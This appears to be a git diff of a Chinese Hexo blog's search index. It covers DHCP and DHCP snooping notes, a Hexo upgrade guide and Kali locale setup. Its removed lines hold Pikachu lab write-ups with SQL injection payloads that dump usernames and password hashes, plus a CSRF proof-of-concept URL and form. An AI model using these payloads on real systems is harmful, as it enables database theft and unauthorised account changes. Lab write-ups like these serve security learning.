-<li>部分用户手动配置IP地址，但DHCP服务器是不知道的，因此在为DHCP用户分配IP地址的时候，用户通过 DHCP获取到的IP地址，在网络中是已经使用的，导致了IP地址冲突。</li>
-</ul>
-</li>
-<li>用户架设非法DHCP服务器<ul>
-<li>在同一VLAN中，如果存在恶意用户私自架设了一台DHCP服务器，那么将会使该VLAN内的用户获取到错误 的IP地址，导致无法接入进校园网</li>
-</ul>
-</li>
-</ul>
-<p>使用IP source guard解决用户手动配置IP地址问题</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105643.png" alt="20" loading="lazy"></p>
-<p>使用DHCP Snooping实现防非法DHCP服务器问题（1）</p>
-<ul>
-<li><p>在接入交换机上使用DHCP Snooping相关功能，可以实现防止下联用户架设非法DHCP服务器 </p>
-</li>
-<li><p>以下为DHCP Snooping原理动画演示：</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105646.png" alt="21" loading="lazy"></p>
-</li>
-<li><p>在接入交换机上使用DHCP Snooping相关功能，可以实现防止下联用户架设非法DHCP服务器 </p>
-</li>
-<li><p>以下为DHCP Snooping配置步骤：</p>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105648.png" alt="22" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>锐捷</category>
-      </categories>
-      <tags>
-        <tag>锐捷</tag>
       </tags>
   </entry>
   <entry>
@@ -516,6 +913,166 @@ select * from users where id&#x3D;1 and greatest(ascii(substr(database(),1,1)),6
       </tags>
   </entry>
   <entry>
+    <title>DHCP协议原理与应用</title>
+    <url>/posts/ca4e8c36/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+
+
+<h1 id="DHCP协议原理与应用"><a href="#DHCP协议原理与应用" class="headerlink" title="DHCP协议原理与应用"></a>DHCP协议原理与应用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）通常被应用在大型的局域网络环 境中，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、Gateway地址、 DNS服务器地址等信息，并能够提升地址的使用率。</p>
+<h2 id="DHCP协议概述"><a href="#DHCP协议概述" class="headerlink" title="DHCP协议概述"></a>DHCP协议概述</h2><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105615.png" alt="7" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105617.png" alt="8" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105619.png" alt="9" loading="lazy"></p>
+<h2 id="DHCP协议工作原理"><a href="#DHCP协议工作原理" class="headerlink" title="DHCP协议工作原理"></a>DHCP协议工作原理</h2><p>DHCP简介</p>
+<ul>
+<li>DHCP（Dynamic Host Configuration Protocol），动态主机配置协议</li>
+<li>定义在RFC2131中， C&#x2F;S架构，为终端设备提供TCP&#x2F;IP参数（IP地址、掩码、网关、DNS等）的自动配置。</li>
+<li>DHCP报文格式和BootP（RFC951、RFC1542）报文兼容，保证了互操作</li>
+</ul>
+<h2 id="DHCP协议名词解释"><a href="#DHCP协议名词解释" class="headerlink" title="DHCP协议名词解释"></a>DHCP协议名词解释</h2><ul>
+<li>DHCP Client <ul>
+<li>DHCP客户机，即用户终端设备，可以是手机、电脑、打印机等需要接入网络的终端设备</li>
+</ul>
+</li>
+<li>DHCP Server <ul>
+<li>DHCP服务器，为终端分配网络参数，管理地址池</li>
+</ul>
+</li>
+</ul>
+<p>DHCP服务器配置</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105621.png" alt="10" loading="lazy"></p>
+<p>PC的DHCP设置</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105624.png" alt="11" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105626.png" alt="12" loading="lazy"></p>
+<p>DHCP协议工作过程</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105627.png" alt="13" loading="lazy"></p>
+<p>DHCP协议报文及用途</p>
+<table>
+<thead>
+<tr>
+<th>报文类型</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DHCP discover</td>
+<td>客户端广播查找可用服务器</td>
+</tr>
+<tr>
+<td>DHCP offer</td>
+<td>服务器响应DHCP discover报文，分配相应配置参数</td>
+</tr>
+<tr>
+<td>DHCP request</td>
+<td>客户端请求配置参数、请求配置确认、续租约</td>
+</tr>
+<tr>
+<td>DHCP ack</td>
+<td>服务器确认DHCP request报文</td>
+</tr>
+<tr>
+<td>DHCP decline</td>
+<td>客户端发现地址被使用时，通知服务器</td>
+</tr>
+<tr>
+<td>DHCP release</td>
+<td>客户端释放地址时通知服务器的报文</td>
+</tr>
+<tr>
+<td>DHCP inform</td>
+<td>客户端已有IP地址，请求更详细配置参数</td>
+</tr>
+<tr>
+<td>DHCP nak</td>
+<td>服务器告诉客户端地址请求不正确或租期已过期</td>
+</tr>
+</tbody></table>
+<p>DHCP协议报文及用途</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105631.png" alt="14" loading="lazy"></p>
+<p>DHCP报文介绍 —— DHCP Offer</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105632.png" alt="15" loading="lazy"></p>
+<p>DHCP报文介绍 —— DHCP Request</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105633.png" alt="16" loading="lazy"></p>
+<p>DHCP报文介绍 —— DHCP Ack</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105635.png" alt="17" loading="lazy"></p>
+<p>DHCP协议的租约</p>
+<ul>
+<li>租约50%时刻<ul>
+<li>客户端主动向服务器发送DHCP request报文，请求更新租约时间； <ul>
+<li>若服务器可用，回复DHCP ack，更新租约； </li>
+<li>若服务器不可用，回复DHCP nak，不更新租约；</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>租约87.5%时刻 <ul>
+<li>客户端主动向服务器发送DHCP request报文，请求更新租约时间； <ul>
+<li>若服务器可用，回复DHCP ack，更新租约； </li>
+<li>若服务器不可用，回复DHCP nak，不更新租约；</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>待到租约时间过去，客户端会重新发送DHCP discover报文。</li>
+</ul>
+<h3 id="DHCP常见部署方式"><a href="#DHCP常见部署方式" class="headerlink" title="DHCP常见部署方式"></a>DHCP常见部署方式</h3><p>校园网中常见的DHCP服务部署方式</p>
+<ul>
+<li>方式一：网关交换机作为DHCP服务器 <ul>
+<li>优势：节省一台服务器资源 </li>
+<li>劣势：地址池配置分散在网络中多台汇聚网关交换机上，无法集中管理</li>
+</ul>
+</li>
+<li>方式二：网关交换机作为DHCP中继，在服务器区部署一台专用的DHCP服务器<ul>
+<li>优势：集中管理，不需要每一个网段都配置一个DHCP服务器，节约资源 </li>
+<li>劣势：需要占用一台服务器资源</li>
+</ul>
+</li>
+</ul>
+<p>方式一：网关交换机作为DHCP服务器</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105637.png" alt="18" loading="lazy"></p>
+<p>方式二：部署专用DHCP服务器</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105640.png" alt="19" loading="lazy"></p>
+<p>DHCP相关安全设计</p>
+<ul>
+<li>用户使用静态IP地址接入<ul>
+<li>部分用户手动配置IP地址，但DHCP服务器是不知道的，因此在为DHCP用户分配IP地址的时候，用户通过 DHCP获取到的IP地址，在网络中是已经使用的，导致了IP地址冲突。</li>
+</ul>
+</li>
+<li>用户架设非法DHCP服务器<ul>
+<li>在同一VLAN中，如果存在恶意用户私自架设了一台DHCP服务器，那么将会使该VLAN内的用户获取到错误 的IP地址，导致无法接入进校园网</li>
+</ul>
+</li>
+</ul>
+<p>使用IP source guard解决用户手动配置IP地址问题</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105643.png" alt="20" loading="lazy"></p>
+<p>使用DHCP Snooping实现防非法DHCP服务器问题（1）</p>
+<ul>
+<li><p>在接入交换机上使用DHCP Snooping相关功能，可以实现防止下联用户架设非法DHCP服务器 </p>
+</li>
+<li><p>以下为DHCP Snooping原理动画演示：</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105646.png" alt="21" loading="lazy"></p>
+</li>
+<li><p>在接入交换机上使用DHCP Snooping相关功能，可以实现防止下联用户架设非法DHCP服务器 </p>
+</li>
+<li><p>以下为DHCP Snooping配置步骤：</p>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105648.png" alt="22" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Deepin检查更新失败</title>
     <url>/posts/8b4f8dc5/</url>
     <content><![CDATA[<p>我们更新deepin系统是总会出现检查更新失败,去终端输入命令发现是没有公钥无法验证下列签名</p>
@@ -571,53 +1128,6 @@ gpg:               已导入：1</code></pre>
       </categories>
       <tags>
         <tag>deepin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo版本升级指南</title>
-    <url>/posts/3ba3be9/</url>
-    <content><![CDATA[<p>&#x2F;&#x2F;以下指令均在Hexo目录下操作，先定位到Hexo目录<br>&#x2F;&#x2F;查看当前版本，判断是否需要升级</p>
-<pre class="language-none"><code class="language-none">hexo version</code></pre>
-
-<p>&#x2F;&#x2F;全局升级hexo-cli</p>
-<pre class="language-none"><code class="language-none">npm i hexo-cli -g</code></pre>
-
-<p>&#x2F;&#x2F;再次查看版本，看hexo-cli是否升级成功</p>
-<pre class="language-none"><code class="language-none">hexo version</code></pre>
-
-<p>&#x2F;&#x2F;安装npm-check，若已安装可以跳过</p>
-<pre class="language-none"><code class="language-none">npm install -g npm-check</code></pre>
-
-<p>&#x2F;&#x2F;检查系统插件是否需要升级</p>
-<pre class="language-none"><code class="language-none">npm-check</code></pre>
-
-<p>&#x2F;&#x2F;安装npm-upgrade，若已安装可以跳过</p>
-<pre class="language-none"><code class="language-none">npm install -g npm-upgrade</code></pre>
-
-<p>&#x2F;&#x2F;更新package.json</p>
-<pre class="language-none"><code class="language-none">npm-upgrade</code></pre>
-
-<p>&#x2F;&#x2F;更新全局插件</p>
-<pre class="language-none"><code class="language-none">npm update -g</code></pre>
-
-<p>&#x2F;&#x2F;更新系统插件</p>
-<pre class="language-none"><code class="language-none">npm update --save</code></pre>
-
-<p>&#x2F;&#x2F;再次查看版本，判断是否升级成功</p>
-<pre class="language-none"><code class="language-none">hexo version</code></pre>
-
-
-
-<br>
-
-<p>文章转载自：<a href="https://novnan.github.io/Hexo/update_hexo/">Hexo版本升级指南</a></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -805,32 +1315,50 @@ gpg:               已导入：1</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Kali-Linux设置为中文</title>
-    <url>/posts/5e07eda7/</url>
-    <content><![CDATA[<ol>
-<li><p>打开终端输入sudo su进入管理员界面</p>
-</li>
-<li><p>输入 dpkg-reconfigure locales  进入软件包设置</p>
-<p> <img src="https://s3.bmp.ovh/imgs/2022/03/1a0bcfc366efca72.png" loading="lazy"></p>
-</li>
-<li><p>用上下键将光标移至“zh_CN.UTF-8 UTF-8”项按空格键选择后回车</p>
-</li>
-</ol>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/3b0c73b054b762f5.png" loading="lazy"></p>
-<ol start="4">
-<li>将光标移至“zh_CN.UTF-8 UTF-8”点击“ok”</li>
-</ol>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/8172a8edacb35ce2.png" loading="lazy"></p>
-<ol start="5">
-<li>等待系统设置；完成后输入 reboot 重启</li>
-</ol>
+    <title>Hexo版本升级指南</title>
+    <url>/posts/3ba3be9/</url>
+    <content><![CDATA[<p>&#x2F;&#x2F;以下指令均在Hexo目录下操作，先定位到Hexo目录<br>&#x2F;&#x2F;查看当前版本，判断是否需要升级</p>
+<pre class="language-none"><code class="language-none">hexo version</code></pre>
+
+<p>&#x2F;&#x2F;全局升级hexo-cli</p>
+<pre class="language-none"><code class="language-none">npm i hexo-cli -g</code></pre>
+
+<p>&#x2F;&#x2F;再次查看版本，看hexo-cli是否升级成功</p>
+<pre class="language-none"><code class="language-none">hexo version</code></pre>
+
+<p>&#x2F;&#x2F;安装npm-check，若已安装可以跳过</p>
+<pre class="language-none"><code class="language-none">npm install -g npm-check</code></pre>
+
+<p>&#x2F;&#x2F;检查系统插件是否需要升级</p>
+<pre class="language-none"><code class="language-none">npm-check</code></pre>
+
+<p>&#x2F;&#x2F;安装npm-upgrade，若已安装可以跳过</p>
+<pre class="language-none"><code class="language-none">npm install -g npm-upgrade</code></pre>
+
+<p>&#x2F;&#x2F;更新package.json</p>
+<pre class="language-none"><code class="language-none">npm-upgrade</code></pre>
+
+<p>&#x2F;&#x2F;更新全局插件</p>
+<pre class="language-none"><code class="language-none">npm update -g</code></pre>
+
+<p>&#x2F;&#x2F;更新系统插件</p>
+<pre class="language-none"><code class="language-none">npm update --save</code></pre>
+
+<p>&#x2F;&#x2F;再次查看版本，判断是否升级成功</p>
+<pre class="language-none"><code class="language-none">hexo version</code></pre>
+
+
+
+<br>
+
+<p>文章转载自：<a href="https://novnan.github.io/Hexo/update_hexo/">Hexo版本升级指南</a></p>
 ]]></content>
       <categories>
         <category>教程</category>
-        <category>Linux</category>
+        <category>博客</category>
       </categories>
       <tags>
-        <tag>kali</tag>
+        <tag>Hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -1168,180 +1696,32 @@ gpg:               已导入：1</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Pikachu--SQL注入(一)</title>
-    <url>/posts/22ddbd5a/</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
-<p> 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</p>
-</blockquote>
-<p>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
-<h2 id="QLS注入攻击总体思路"><a href="#QLS注入攻击总体思路" class="headerlink" title="QLS注入攻击总体思路"></a>QLS注入攻击总体思路</h2><ol>
-<li>寻找SQL注入位置</li>
-<li>判断服务器类型和后台数据类型</li>
-<li>针对不同的服务器和数据库特点进行SQL注入攻击</li>
+    <title>Kali-Linux设置为中文</title>
+    <url>/posts/5e07eda7/</url>
+    <content><![CDATA[<ol>
+<li><p>打开终端输入sudo su进入管理员界面</p>
+</li>
+<li><p>输入 dpkg-reconfigure locales  进入软件包设置</p>
+<p> <img src="https://s3.bmp.ovh/imgs/2022/03/1a0bcfc366efca72.png" loading="lazy"></p>
+</li>
+<li><p>用上下键将光标移至“zh_CN.UTF-8 UTF-8”项按空格键选择后回车</p>
+</li>
 </ol>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>首先打开burp抓包，发现时post方法</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190944.png" alt="1" loading="lazy"></p>
-<h4 id="方法一：利用burp改包"><a href="#方法一：利用burp改包" class="headerlink" title="方法一：利用burp改包"></a>方法一：利用burp改包</h4><pre class="language-none"><code class="language-none">id&#x3D;1 or 1&#x3D;1#		</code></pre>
-
-<p>可以看到，页面将所有id的信息返回了，可知存在数字型注入。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190948.png" alt="2" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1&#39; 					 报错，可判断存在SQL注入</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190951.png" alt="3" loading="lazy"></p>
-<p>确定回显字段</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 order by 3			报错</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191206.png" alt="4" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 order by 2 		存在两个回显，字段数为2</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191211.png" alt="5" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,2		判断回显点，可以在1和2这两处位置，获得我们想要的信息</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191213.png" alt="6" loading="lazy"></p>
-<p>查询数据库名称</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select user(),database() 	 用户名为root@locallhost，数据库为pikachu</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191216.png" alt="7" loading="lazy"></p>
-<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191218.png" alt="8" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191221.png" alt="9" loading="lazy"></p>
-<p>查询user下所有表名</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#    </code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191223.png" alt="10" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_schema&#x3D;database()#      </code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191226.png" alt="11" loading="lazy"></p>
-<p>查询字段username和password的内容</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select group_concat(username),group_concat(password) from users</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191229.png" alt="12" loading="lazy"></p>
-<h4 id="方法二、利用harbar"><a href="#方法二、利用harbar" class="headerlink" title="方法二、利用harbar"></a>方法二、利用harbar</h4><p>（Todo代办）</p>
-<p>对应账号和MD5加密的密码：</p>
-<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
-<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
-<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
-<h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><p>输入： </p>
-<pre class="language-none"><code class="language-none">select id,email from member where username&#x3D;&#39;&#39; or 1&#x3D;1-- q&#39;
-或
-?name&#x3D;%27&amp;submit&#x3D;查询     %27  &#x3D;&#x3D; &#39;  get</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191233.png" alt="13" loading="lazy"></p>
-<p>也可以直接在url中的name参数后进行修改</p>
-<pre class="language-none"><code class="language-none">name&#x3D;%27&amp;submit&#x3D;查询				报错，判断存在SQL注入</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191236.png" alt="14" loading="lazy"></p>
-<p>查询出所有账户数据</p>
-<pre class="language-none"><code class="language-none">&#39; or 1&#x3D;1-- q			</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191238.png" alt="15" loading="lazy"></p>
-<p>确定回显字段</p>
-<pre class="language-none"><code class="language-none">&#39; order by 3 -- q		报错</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191240.png" alt="16" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; order by 2 -- q				有两个回显</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191243.png" alt="17" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; union select 1,2 -- q				判断回显点</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191246.png" alt="18" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; union select user(),database() -- q		可知用户名为root@localhost，数据库名为pikachu</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191249.png" alt="19" loading="lazy"></p>
-<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
-<pre class="language-none"><code class="language-none">&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191256.png" alt="20" loading="lazy"></p>
-<p>查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</p>
-<pre class="language-none"><code class="language-none">&#39; union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191259.png" alt="21" loading="lazy"></p>
-<p>查询字段username和password的内容</p>
-<pre class="language-none"><code class="language-none">&#39; union select group_concat(username),group_concat(password) from users -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191303.png" alt="22" loading="lazy"></p>
-<hr>
-<p>参考链接： </p>
-<p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
-<p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/3b0c73b054b762f5.png" loading="lazy"></p>
+<ol start="4">
+<li>将光标移至“zh_CN.UTF-8 UTF-8”点击“ok”</li>
+</ol>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/8172a8edacb35ce2.png" loading="lazy"></p>
+<ol start="5">
+<li>等待系统设置；完成后输入 reboot 重启</li>
+</ol>
 ]]></content>
       <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>Pikachu</category>
+        <category>教程</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>pikachu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pikachu--CSRF</title>
-    <url>/posts/546fe1af/</url>
-    <content><![CDATA[<h1 id="Pikachu——CSRF"><a href="#Pikachu——CSRF" class="headerlink" title="Pikachu——CSRF"></a>Pikachu——CSRF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站]对用户网页浏览器的信任。</p>
-<p>来自:<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/13777878?fromtitle=CSRF&fromid=2735433&fr=aladdin">百度百科 </a></p>
-<h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。<br>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p>
-<h2 id="一、CSRF-get"><a href="#一、CSRF-get" class="headerlink" title="一、CSRF(get)"></a>一、CSRF(get)</h2><p>登陆后点击修改信息</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004817.png" alt="1" loading="lazy"></p>
-<p>然后浏览器上代理，用burpsuite抓包</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004869.png" alt="2" loading="lazy"></p>
-<p>上面是get请求的内容，我们把phonenum的值修改为123456，然后forword，发现账号kobe的信息发生了变化，结果如下图：</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004468.png" alt="3" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004134.png" alt="4" loading="lazy"><em>修改成功</em></p>
-<p>也可以直接构造一个url:</p>
-<p><code> http://192.168.224.135/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hack&amp;phonenum=hack&amp;add=123456&amp;email=kobe%40pikachu.com&amp;submit=submit</code> </p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004797.png" alt="5" loading="lazy"><em>修改成功</em></p>
-<h2 id="二、CSRF（POST）"><a href="#二、CSRF（POST）" class="headerlink" title="二、CSRF（POST）"></a>二、CSRF（POST）</h2><p>也是先登录，这是必要的，然后抓取提交修改的流量，是POST方式。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004132.png" alt="6" loading="lazy"></p>
-<p>直接在包中修改信息</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005813.png" alt="7" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005429.png" alt="8" loading="lazy"></p>
-<p>也可以自己建一个表单，让被攻击者点恶意站点表单的URL。通过表单的URL去向存在CSRF漏洞的页面去提交POST请求。</p>
-<p>表单代码:</p>
-<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
-  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.224.135/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>61<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>132<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
